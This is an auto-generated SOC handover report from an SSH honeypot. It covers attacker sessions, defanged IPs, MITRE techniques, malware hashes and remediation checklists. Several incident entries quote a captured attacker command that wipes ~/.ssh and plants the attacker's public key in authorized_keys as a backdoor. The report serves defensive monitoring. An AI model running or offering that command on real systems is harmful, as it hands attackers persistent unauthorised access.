### 🔴 HIGH · IR-ad3ab0ac3b35

| Field | Detail |
|---|---|
| **Source IP** | `103.82.37[.]117` |
| **First Seen** | 2026-04-10 19:53 |
| **Last Seen** | 2026-04-10 19:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:53:18` | `cowrie.session.connect` |
| `2026-04-10 19:53:18` | `cowrie.client.version` |
| `2026-04-10 19:53:18` | `cowrie.client.kex` |
| `2026-04-10 19:53:18` | `cowrie.login.success` |
| `2026-04-10 19:53:19` | `cowrie.session.params` |
| `2026-04-10 19:53:19` | `cowrie.command.input` |
| `2026-04-10 19:53:19` | `cowrie.command.failed` |
| `2026-04-10 19:53:19` | `cowrie.log.closed` |
| `2026-04-10 19:53:19` | `cowrie.session.params` |
| `2026-04-10 19:53:19` | `cowrie.command.input` |
| `2026-04-10 19:53:19` | `cowrie.session.file_download` |
| `2026-04-10 19:53:19` | `cowrie.log.closed` |
| `2026-04-10 19:53:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.82.37[.]117` to AbuseIPDB if not already reported
- [ ] Block `103.82.37[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4eec5413fb91

| Field | Detail |
|---|---|
| **Source IP** | `103.82.37[.]117` |
| **First Seen** | 2026-04-10 19:53 |
| **Last Seen** | 2026-04-10 19:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:53:21` | `cowrie.session.connect` |
| `2026-04-10 19:53:21` | `cowrie.client.version` |
| `2026-04-10 19:53:21` | `cowrie.client.kex` |
| `2026-04-10 19:53:22` | `cowrie.login.success` |
| `2026-04-10 19:53:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.82.37[.]117` to AbuseIPDB if not already reported
- [ ] Block `103.82.37[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0f0578f6cb0

| Field | Detail |
|---|---|
| **Source IP** | `103.82.37[.]117` |
| **First Seen** | 2026-04-10 19:55 |
| **Last Seen** | 2026-04-10 19:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:55:10` | `cowrie.session.connect` |
| `2026-04-10 19:55:10` | `cowrie.client.version` |
| `2026-04-10 19:55:10` | `cowrie.client.kex` |
| `2026-04-10 19:55:10` | `cowrie.login.success` |
| `2026-04-10 19:55:11` | `cowrie.session.params` |
| `2026-04-10 19:55:11` | `cowrie.command.input` |
| `2026-04-10 19:55:11` | `cowrie.command.failed` |
| `2026-04-10 19:55:11` | `cowrie.log.closed` |
| `2026-04-10 19:55:11` | `cowrie.session.params` |
| `2026-04-10 19:55:11` | `cowrie.command.input` |
| `2026-04-10 19:55:11` | `cowrie.session.file_download` |
| `2026-04-10 19:55:11` | `cowrie.log.closed` |
| `2026-04-10 19:55:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.82.37[.]117` to AbuseIPDB if not already reported
- [ ] Block `103.82.37[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ec6b8ec0a2c

| Field | Detail |
|---|---|
| **Source IP** | `103.82.37[.]117` |
| **First Seen** | 2026-04-10 19:55 |
| **Last Seen** | 2026-04-10 19:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:55:13` | `cowrie.session.connect` |
| `2026-04-10 19:55:13` | `cowrie.client.version` |
| `2026-04-10 19:55:13` | `cowrie.client.kex` |
| `2026-04-10 19:55:14` | `cowrie.login.success` |
| `2026-04-10 19:55:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.82.37[.]117` to AbuseIPDB if not already reported
- [ ] Block `103.82.37[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec728596a8a5

| Field | Detail |
|---|---|
| **Source IP** | `34.0.13[.]61` |
| **First Seen** | 2026-04-10 19:56 |
| **Last Seen** | 2026-04-10 19:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:56:37` | `cowrie.session.connect` |
| `2026-04-10 19:56:37` | `cowrie.client.version` |
| `2026-04-10 19:56:37` | `cowrie.client.kex` |
| `2026-04-10 19:56:37` | `cowrie.login.success` |
| `2026-04-10 19:56:37` | `cowrie.session.params` |
| `2026-04-10 19:56:37` | `cowrie.command.input` |
| `2026-04-10 19:56:37` | `cowrie.command.failed` |
| `2026-04-10 19:56:37` | `cowrie.log.closed` |
| `2026-04-10 19:56:37` | `cowrie.session.params` |
| `2026-04-10 19:56:37` | `cowrie.command.input` |
| `2026-04-10 19:56:38` | `cowrie.session.file_download` |
| `2026-04-10 19:56:38` | `cowrie.log.closed` |
| `2026-04-10 19:56:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.0.13[.]61` to AbuseIPDB if not already reported
- [ ] Block `34.0.13[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc8bbd213b4c

| Field | Detail |
|---|---|
| **Source IP** | `34.0.13[.]61` |
| **First Seen** | 2026-04-10 19:56 |
| **Last Seen** | 2026-04-10 19:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:56:39` | `cowrie.session.connect` |
| `2026-04-10 19:56:39` | `cowrie.client.version` |
| `2026-04-10 19:56:39` | `cowrie.client.kex` |
| `2026-04-10 19:56:39` | `cowrie.login.success` |
| `2026-04-10 19:56:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.0.13[.]61` to AbuseIPDB if not already reported
- [ ] Block `34.0.13[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2586ef823119

| Field | Detail |
|---|---|
| **Source IP** | `103.82.37[.]117` |
| **First Seen** | 2026-04-10 20:00 |
| **Last Seen** | 2026-04-10 20:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 20:00:18` | `cowrie.session.connect` |
| `2026-04-10 20:00:18` | `cowrie.client.version` |
| `2026-04-10 20:00:18` | `cowrie.client.kex` |
| `2026-04-10 20:00:19` | `cowrie.login.success` |
| `2026-04-10 20:00:19` | `cowrie.session.params` |
| `2026-04-10 20:00:19` | `cowrie.command.input` |
| `2026-04-10 20:00:19` | `cowrie.command.failed` |
| `2026-04-10 20:00:19` | `cowrie.log.closed` |
| `2026-04-10 20:00:19` | `cowrie.session.params` |
| `2026-04-10 20:00:19` | `cowrie.command.input` |
| `2026-04-10 20:00:20` | `cowrie.session.file_download` |
| `2026-04-10 20:00:20` | `cowrie.log.closed` |
| `2026-04-10 20:00:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.82.37[.]117` to AbuseIPDB if not already reported
- [ ] Block `103.82.37[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ada7ca340b91

| Field | Detail |
|---|---|
| **Source IP** | `103.82.37[.]117` |
| **First Seen** | 2026-04-10 20:00 |
| **Last Seen** | 2026-04-10 20:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 20:00:22` | `cowrie.session.connect` |
| `2026-04-10 20:00:22` | `cowrie.client.version` |
| `2026-04-10 20:00:22` | `cowrie.client.kex` |
| `2026-04-10 20:00:23` | `cowrie.login.success` |
| `2026-04-10 20:00:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.82.37[.]117` to AbuseIPDB if not already reported
- [ ] Block `103.82.37[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23668ee47494

| Field | Detail |
|---|---|
| **Source IP** | `34.0.13[.]61` |
| **First Seen** | 2026-04-10 20:03 |
| **Last Seen** | 2026-04-10 20:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 20:03:12` | `cowrie.session.connect` |
| `2026-04-10 20:03:12` | `cowrie.client.version` |
| `2026-04-10 20:03:12` | `cowrie.client.kex` |
| `2026-04-10 20:03:12` | `cowrie.login.success` |
| `2026-04-10 20:03:12` | `cowrie.session.params` |
| `2026-04-10 20:03:12` | `cowrie.command.input` |
| `2026-04-10 20:03:12` | `cowrie.command.failed` |
| `2026-04-10 20:03:13` | `cowrie.log.closed` |
| `2026-04-10 20:03:13` | `cowrie.session.params` |
| `2026-04-10 20:03:13` | `cowrie.command.input` |
| `2026-04-10 20:03:13` | `cowrie.session.file_download` |
| `2026-04-10 20:03:13` | `cowrie.log.closed` |
| `2026-04-10 20:03:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.0.13[.]61` to AbuseIPDB if not already reported
- [ ] Block `34.0.13[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffaacf4e96d5

| Field | Detail |
|---|---|
| **Source IP** | `34.0.13[.]61` |
| **First Seen** | 2026-04-10 20:03 |
| **Last Seen** | 2026-04-10 20:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 20:03:14` | `cowrie.session.connect` |
| `2026-04-10 20:03:14` | `cowrie.client.version` |
| `2026-04-10 20:03:14` | `cowrie.client.kex` |
| `2026-04-10 20:03:14` | `cowrie.login.success` |
| `2026-04-10 20:03:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.0.13[.]61` to AbuseIPDB if not already reported
- [ ] Block `34.0.13[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `103.82.37[.]117` | **25** | 2026-04-10 19:19 | 2026-04-10 20:03 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `120.48.147[.]81` | **25** | 2026-04-10 19:03 | 2026-04-10 19:17 | 38m | 5 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `34.0.13[.]61` | **25** | 2026-04-10 19:21 | 2026-04-10 20:12 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `42.112.42[.]129` | **25** | 2026-04-10 18:59 | 2026-04-10 19:47 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `76.79.213[.]69` | **3** | 2026-04-10 19:18 | 2026-04-10 19:24 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `170.79.37[.]88` | **2** | 2026-04-10 18:59 | 2026-04-10 19:04 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `1.94.220[.]55` | 1 | 2026-04-10 19:24 | 2026-04-10 19:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `119.96.81[.]99` | 1 | 2026-04-10 19:22 | 2026-04-10 19:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.76[.]60` | 1 | 2026-04-10 19:03 | 2026-04-10 19:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `223.17.5[.]126` | 1 | 2026-04-10 19:22 | 2026-04-10 19:22 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.88.156[.]34` | 1 | 2026-04-10 20:28 | 2026-04-10 20:29 | 61s | 0 | `T1592` | 🟢 LOW |
| `77.105.132[.]10` | 1 | 2026-04-10 18:58 | 2026-04-10 18:58 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `87.139.35[.]114` | 1 | 2026-04-10 19:19 | 2026-04-10 19:19 | 7s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 41/100 | 🟡 MEDIUM | **28/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `119.96.81[.]99` | CN | CHINANET Hubei province network | **100** ⚠️ | 11 |
| `77.105.132[.]10` | DE | New Hosting Technologies LLC | **100** ⚠️ | 3 |
| `49.88.156[.]34` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `34.0.13[.]61` | IN | Google LLC | **100** ⚠️ | 30 |
| `223.17.5[.]126` | HK | HGC Global Communications Limited | **100** ⚠️ | 50 |
| `42.112.42[.]129` | VN | FPT Telecom | **100** ⚠️ | 50 |
| `76.79.213[.]69` | US | Charter Communications Inc | **100** ⚠️ | 50 |
| `170.79.37[.]88` | PE | Telefonica del Peru S.A.A. | **100** ⚠️ | 50 |
| `120.48.147[.]81` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `103.82.37[.]117` | VN | CLOUDFLY CORPORATION | **100** ⚠️ | 45 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 182 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 87 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 71 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 35 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 35 |

---

## 🔕 False Positive Summary (3 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 185 cases |
| Tool 34  | Credential Extractor        | ✅ 158 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 16 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 3 filtered (1.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 14 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 70 priority case(s) shown individually · 13 recon entry/entries in table (6 group(s) consolidating 105 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-10T20:34:44Z_
